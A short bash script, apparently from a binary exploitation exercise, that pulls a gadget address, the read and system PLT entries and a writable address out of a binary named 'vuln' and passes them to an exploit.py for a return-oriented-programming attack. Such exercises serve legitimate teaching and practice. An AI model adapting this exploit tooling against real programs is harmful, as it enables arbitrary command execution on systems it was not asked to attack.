#!/usr/bin/env bash
# author: Hendrik Werner

print_pointer() {
	printf '0x%016x\n' $1
}

gadget_address=$(print_pointer 0x4006ee)
read_address=$(print_pointer 0x$(objdump -d vuln | grep -oP '^[\da-z]+(?= <read@plt>)'))
system_address=$(print_pointer 0x$(objdump -d vuln | grep -oP '^[\da-z]+(?= <system@plt>)'))
writable_address=$(print_pointer 0x601040)

(
	echo "Gadget address: $gadget_address"
	echo "Read address: $read_address"
	echo "System address: $system_address"
	echo "Writable address: $writable_address"
) | column -t -s:

./exploit.py\
	--gadget $gadget_address\
	--read $read_address\
	--system $system_address\
	--writable $writable_address
